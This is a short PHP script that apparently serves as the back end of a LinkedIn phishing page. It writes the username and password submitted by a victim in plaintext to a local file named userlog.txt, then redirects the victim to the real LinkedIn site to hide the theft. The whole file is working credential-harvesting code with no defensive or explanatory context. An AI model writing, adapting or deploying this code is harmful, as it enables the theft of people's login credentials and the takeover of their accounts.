<?php

file_put_contents("userlog.txt", "Linkedin Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.linkedin.com/');
exit();